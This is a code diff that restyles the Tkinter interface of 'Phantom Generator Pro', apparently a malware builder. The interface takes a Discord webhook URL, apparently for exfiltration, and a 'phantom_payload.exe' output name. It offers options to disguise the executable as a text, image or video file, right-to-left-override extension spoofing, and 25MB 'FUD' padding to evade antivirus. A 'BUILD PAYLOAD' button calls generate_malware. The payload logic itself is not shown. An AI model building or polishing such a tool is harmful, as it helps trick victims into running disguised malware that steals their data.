@@ -28,26 +28,45 @@ class Phantom:
     def __init__(self, root):
         self.root = root
         self.root.title("Phantom Generator Pro")
-        self.root.geometry("600x650")
-        self.root.configure(bg="#1a1a1a")
-        self.root.resizable(True, True)
+        self.root.geometry("750x700")
+        self.root.configure(bg="#0f0f12")
+        self.root.resizable(False, False)
         
-        # Style
-        style = ttk.Style()
-        style.theme_use('clam')
-        
-        # Colors
-        BG_COLOR = "#1a1a1a"
-        ACCENT_COLOR = "#3498db"
-        TEXT_COLOR = "#ecf0f1"
-        SECONDARY_BG = "#2c3e50"
+        # Colors & Styles
+        self.colors = {
+            "bg": "#0f0f12",
+            "panel": "#1a1a1f",
+            "accent": "#00a8ff",
+            "text": "#ffffff",
+            "text_dim": "#a0a0a5",
+            "border": "#2d2d35",
+            "success": "#2ecc71",
+            "warning": "#f1c40f",
+            "danger": "#e74c3c"
+        }
 
-        style.configure("TFrame", background=BG_COLOR)
-        style.configure("TLabel", background=BG_COLOR, foreground=TEXT_COLOR, font=("Segoe UI", 10))
-        style.configure("TButton", font=("Segoe UI", 10, "bold"))
-        style.configure("Header.TLabel", font=("Segoe UI", 20, "bold"), foreground=ACCENT_COLOR)
-        style.configure("Status.TLabel", font=("Segoe UI", 9, "italic"), foreground="#95a5a6")
-        style.configure("Horizontal.TProgressbar", thickness=10)
+        self.style = ttk.Style()
+        self.style.theme_use('clam')
+        
+        # Configure Ttk Styles
+        self.style.configure("TFrame", background=self.colors["bg"])
+        self.style.configure("Panel.TFrame", background=self.colors["panel"], borderwidth=1, relief="flat")
+        
+        self.style.configure("TLabel", background=self.colors["bg"], foreground=self.colors["text"], font=("Segoe UI", 10))
+        self.style.configure("Panel.TLabel", background=self.colors["panel"], foreground=self.colors["text"], font=("Segoe UI", 10))
+        self.style.configure("Header.TLabel", background=self.colors["bg"], foreground=self.colors["accent"], font=("Segoe UI", 22, "bold"))
+        self.style.configure("Section.TLabel", background=self.colors["panel"], foreground=self.colors["accent"], font=("Segoe UI", 11, "bold"))
+        
+        self.style.configure("TEntry", fieldbackground=self.colors["bg"], foreground=self.colors["text"], borderwidth=0)
+        
+        self.style.configure("Action.TButton", font=("Segoe UI", 10, "bold"), padding=10)
+        self.style.map("Action.TButton",
+            background=[('active', self.colors["accent"]), ('!disabled', self.colors["panel"])],
+            foreground=[('active', "#ffffff"), ('!disabled', self.colors["text"])]
+        )
+
+        self.style.configure("Generate.TButton", font=("Segoe UI", 12, "bold"), background=self.colors["accent"], foreground="#ffffff")
+        self.style.map("Generate.TButton", background=[('active', "#0086cc")])
 
         # Initialize attributes
         self.destination = None
@@ -55,84 +74,136 @@ class Phantom:
         self.media_path = None
         self.go_executable = self._find_go_executable()
 
-        # Main Container
-        main_frame = ttk.Frame(root, padding="20")
-        main_frame.pack(fill=tk.BOTH, expand=True)
+        self._build_ui()
+
+    def _build_ui(self):
+        # Main Layout
+        container = ttk.Frame(self.root, padding="30")
+        container.pack(fill=tk.BOTH, expand=True)
+
+        # Title Section
+        title_frame = ttk.Frame(container)
+        title_frame.pack(fill=tk.X, pady=(0, 25))
         
-        # Header
-        header = ttk.Label(main_frame, text="PHANTOM GENERATOR V2", style="Header.TLabel")
-        header.pack(pady=(0, 15))
+        header = ttk.Label(title_frame, text="PHANTOM", style="Header.TLabel")
+        header.pack(side=tk.LEFT)
+        
+        version = ttk.Label(title_frame, text="V2.1 PRO EDITION", font=("Segoe UI", 9, "bold"), foreground=self.colors["text_dim"])
+        version.pack(side=tk.LEFT, padx=10, pady=(10, 0))
 
-        # Webhook URL
-        ttk.Label(main_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
-        self.url_entry = ttk.Entry(main_frame, width=60)
-        self.url_entry.pack(fill=tk.X, pady=(5, 10))
+        # --- CONFIGURATION PANEL ---
+        config_panel = ttk.Frame(container, style="Panel.TFrame", padding=20)
+        config_panel.pack(fill=tk.BOTH, expand=True)
 
+        # Webhook
+        self._create_input_section(config_panel, "Discord Webhook URL", "Paste your webhook here...", "url_entry")
+        
         # EXE Name
-        ttk.Label(main_frame, text="Output EXE Name:").pack(anchor=tk.W)
-        self.exe_entry = ttk.Entry(main_frame, width=60)
-        self.exe_entry.insert(0, "phantom_payload.exe")
-        self.exe_entry.pack(fill=tk.X, pady=(5, 10))
+        self._create_input_section(config_panel, "Output File Name", "payload.exe", "exe_entry", default="phantom_payload.exe")
 
-        # Mode Selection Frame
-        mode_frame = ttk.LabelFrame(main_frame, text="🎭 Payload Mode", padding=10)
-        mode_frame.pack(fill=tk.X, pady=(0, 10))
+        # Two Columns for Options
+        options_grid = ttk.Frame(config_panel, style="Panel.TFrame")
+        options_grid.pack(fill=tk.X, pady=15)
+        options_grid.columnconfigure(0, weight=1)
+        options_grid.columnconfigure(1, weight=1)
 
-        self.mode_var = tk.StringVar(value="None")
+        # Column 1: Mode Selection
+        mode_section = ttk.Frame(options_grid, style="Panel.TFrame")
+        mode_section.grid(row=0, column=0, sticky="nw", padx=(0, 10))
         
-        # Grid layout for modes
-        ttk.Radiobutton(mode_frame, text="Normal EXE", variable=self.mode_var, value="None", command=self.update_media_button).grid(row=0, column=0, sticky=tk.W, padx=5)
-        ttk.Radiobutton(mode_frame, text="Notepad (.txt)", variable=self.mode_var, value="Notepad", command=self.update_media_button).grid(row=0, column=1, sticky=tk.W, padx=5)
-        ttk.Radiobutton(mode_frame, text="Image (.png)", variable=self.mode_var, value="Image", command=self.update_media_button).grid(row=1, column=0, sticky=tk.W, padx=5)
-        ttk.Radiobutton(mode_frame, text="Video (.mp4)", variable=self.mode_var, value="Video", command=self.update_media_button).grid(row=1, column=1, sticky=tk.W, padx=5)
+        ttk.Label(mode_section, text="PAYLOAD MODE", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 10))
+        
+        self.mode_var = tk.StringVar(value="None")
+        modes = [("Normal EXE", "None"), ("Notepad (.txt)", "Notepad"), ("Image (.png)", "Image"), ("Video (.mp4)", "Video")]
+        
+        for text, value in modes:
+            rb = tk.Radiobutton(mode_section, text=text, variable=self.mode_var, value=value,
+                                 command=self.update_media_button, bg=self.colors["panel"], 
+                                 fg=self.colors["text"], selectcolor=self.colors["bg"],
+                                 activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
+                                 font=("Segoe UI", 9), bd=0, highlightthickness=0)
+            rb.pack(anchor=tk.W, pady=2)
 
-        # Camouflage Options Frame
-        camo_frame = ttk.LabelFrame(main_frame, text="🛡️ Stealth Options", padding=10)
-        camo_frame.pack(fill=tk.X, pady=(0, 10))
-
+        # Column 2: Stealth Options
+        stealth_section = ttk.Frame(options_grid, style="Panel.TFrame")
+        stealth_section.grid(row=0, column=1, sticky="nw", padx=(10, 0))
+        
+        ttk.Label(stealth_section, text="STEALTH SETTINGS", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 10))
+        
         self.rtlo_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(camo_frame, text="RTLO Spoofing (Extension)", variable=self.rtlo_var).grid(row=0, column=0, sticky=tk.W, padx=5)
-
+        self._create_modern_check(stealth_section, "RTLO Extension Spoofing", self.rtlo_var)
+        
         self.fud_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(camo_frame, text="FUD (Padding 25MB)", variable=self.fud_var).grid(row=0, column=1, sticky=tk.W, padx=5)
+        self._create_modern_check(stealth_section, "FUD Padding (25MB)", self.fud_var)
 
-        # Buttons Frame
-        btn_frame = ttk.Frame(main_frame)
-        btn_frame.pack(fill=tk.X, pady=10)
+        # --- ASSETS SECTION ---
+        assets_frame = ttk.Frame(config_panel, style="Panel.TFrame")
+        assets_frame.pack(fill=tk.X, pady=15)
+        
+        # Buttons Row
+        btns_row = ttk.Frame(assets_frame, style="Panel.TFrame")
+        btns_row.pack(fill=tk.X)
 
-        self.destination_button = ttk.Button(btn_frame, text="📁 Destination", command=self.select_destination)
+        self.destination_button = ttk.Button(btns_row, text="📁 DESTINATION", style="Action.TButton", command=self.select_destination)
         self.destination_button.pack(side=tk.LEFT, padx=(0, 5), expand=True, fill=tk.X)
 
-        self.icon_button = ttk.Button(btn_frame, text="🖼️ Icon", command=self.select_icon)
+        self.icon_button = ttk.Button(btns_row, text="🖼️ CUSTOM ICON", style="Action.TButton", command=self.select_icon)
         self.icon_button.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
 
-        self.media_button = ttk.Button(btn_frame, text="🎬 Select Media", command=self.select_media, state=tk.DISABLED)
+        self.media_button = ttk.Button(btns_row, text="🎬 SELECT MEDIA", style="Action.TButton", command=self.select_media, state=tk.DISABLED)
         self.media_button.pack(side=tk.LEFT, padx=(5, 0), expand=True, fill=tk.X)
 
-        # Status Labels
-        info_frame = ttk.Frame(main_frame)
-        info_frame.pack(fill=tk.X, pady=5)
-
-        self.dest_label = ttk.Label(info_frame, text="📍 No folder selected", font=("Segoe UI", 8), foreground="#bdc3c7")
-        self.dest_label.pack(anchor=tk.W)
+        # Asset Labels
+        labels_row = ttk.Frame(assets_frame, style="Panel.TFrame", padding=(0, 10))
+        labels_row.pack(fill=tk.X)
         
-        self.icon_label = ttk.Label(info_frame, text="🖼️ No icon selected", font=("Segoe UI", 8), foreground="#bdc3c7")
+        self.dest_label = ttk.Label(labels_row, text="📍 No destination set", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
+        self.dest_label.pack(anchor=tk.W)
+        self.icon_label = ttk.Label(labels_row, text="🖼️ No icon selected", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
         self.icon_label.pack(anchor=tk.W)
-
-        self.media_label = ttk.Label(info_frame, text="🎬 No media binded", font=("Segoe UI", 8), foreground="#bdc3c7")
+        self.media_label = ttk.Label(labels_row, text="🎬 No media binded", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
         self.media_label.pack(anchor=tk.W)
 
-        # Generate Button
-        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PHANTOM PAYLOAD", command=self.generate_malware)
-        self.generate_button.pack(fill=tk.X, pady=(15, 10))
+        # --- GENERATE SECTION ---
+        gen_frame = ttk.Frame(container)
+        gen_frame.pack(fill=tk.X, pady=(25, 0))
 
-        # Progress
+        self.generate_button = tk.Button(gen_frame, text="BUILD PAYLOAD", command=self.generate_malware,
+                                         bg=self.colors["accent"], fg="#ffffff", font=("Segoe UI", 12, "bold"),
+                                         activebackground="#0086cc", activeforeground="#ffffff",
+                                         bd=0, cursor="hand2", pady=12)
+        self.generate_button.pack(fill=tk.X)
+
+        # Progress & Status
         self.progress_var = tk.DoubleVar()
-        self.progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100, style="Horizontal.TProgressbar")
-        self.progress_bar.pack(fill=tk.X, pady=(10, 5))
+        self.progress_bar = ttk.Progressbar(container, variable=self.progress_var, maximum=100)
+        self.progress_bar.pack(fill=tk.X, pady=(20, 10))
         
-        self.status_label = ttk.Label(main_frame, text="Ready", style="Status.TLabel")
+        self.status_label = ttk.Label(container, text="Ready for deployment", font=("Segoe UI", 9, "italic"), foreground=self.colors["text_dim"])
         self.status_label.pack()
+
+    def _create_input_section(self, parent, label, placeholder, attr_name, default=""):
+        frame = ttk.Frame(parent, style="Panel.TFrame")
+        frame.pack(fill=tk.X, pady=10)
+        
+        ttk.Label(frame, text=label.upper(), style="Section.TLabel").pack(anchor=tk.W, pady=(0, 5))
+        
+        entry_container = tk.Frame(frame, bg=self.colors["bg"], padx=10, pady=8)
+        entry_container.pack(fill=tk.X)
+        
+        entry = tk.Entry(entry_container, bg=self.colors["bg"], fg=self.colors["text"],
+                         insertbackground=self.colors["text"], font=("Segoe UI", 10),
+                         bd=0, highlightthickness=0)
+        entry.pack(fill=tk.X)
+        if default: entry.insert(0, default)
+        setattr(self, attr_name, entry)
+
+    def _create_modern_check(self, parent, text, var):
+        cb = tk.Checkbutton(parent, text=text, variable=var, bg=self.colors["panel"],
+                            fg=self.colors["text"], selectcolor=self.colors["bg"],
+                            activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
+                            font=("Segoe UI", 9), bd=0, highlightthickness=0)
+        cb.pack(anchor=tk.W, pady=2)
     
     def _find_go_executable(self):
         """Find the Go executable in the system"""
